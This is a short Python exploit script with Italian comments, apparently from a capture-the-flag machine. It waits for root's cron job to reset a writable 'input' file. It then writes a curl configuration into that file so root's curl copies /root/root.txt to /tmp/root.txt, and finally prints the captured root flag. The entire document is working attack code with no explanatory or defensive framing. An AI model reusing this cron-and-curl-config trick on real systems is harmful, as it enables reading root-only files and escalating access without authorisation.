import os
import time

INPUT_FILE = "/home/floris/admin-area/input"
FLAG_DEST = "/tmp/root.txt"

# Le due righe di configurazione che vogliamo far leggere a curl
CONFIG_CONTENT = f'url = "file:///root/root.txt"\noutput = "{FLAG_DEST}"\n'

def main():
    print("[*] Avvio exploit per la flag di root...")
    
    # 1. Attendi che il file venga resettato da root (inizio del minuto)
    print("[*] In attesa del reset del file 'input' da parte di root...")
    last_mtime = os.path.getmtime(INPUT_FILE) if os.path.exists(INPUT_FILE) else 0
    
    while True:
        current_mtime = os.path.getmtime(INPUT_FILE) if os.path.exists(INPUT_FILE) else 0
        if current_mtime != last_mtime:
            print("[+] Root ha appena resettato il file! (Nuovo minuto iniziato)")
            break
        time.sleep(0.5)
    
    # 2. Aspetta 2 secondi per essere sicuro che il processo 'cat' di root abbia finito
    time.sleep(2)
    
    # 3. Scrivi la configurazione una volta sola
    print("[*] Scrittura della configurazione personalizzata nel file 'input'...")
    try:
        with open(INPUT_FILE, "w") as f:
            f.write(CONFIG_CONTENT)
        print("[+] Scrittura completata con successo!")
    except PermissionError:
        print("[-] Errore: Permesso negato. Riprova tra un attimo.")
        return

    # 4. Attendi lo scatto del cronjob successivo
    print("[*] Attesa del prossimo minuto affinché curl legga il file...")
    
    while True:
        if os.path.exists(FLAG_DEST) and os.path.getsize(FLAG_DEST) > 0:
            print("\n" + "="*40)
            print("[+] FLAG DI ROOT CATTURATA CON SUCCESSO!")
            print("="*40)
            with open(FLAG_DEST, "r") as f:
                print(f.read().strip())
            print("="*40)
            break
        time.sleep(2)

if __name__ == "__main__":
    main()
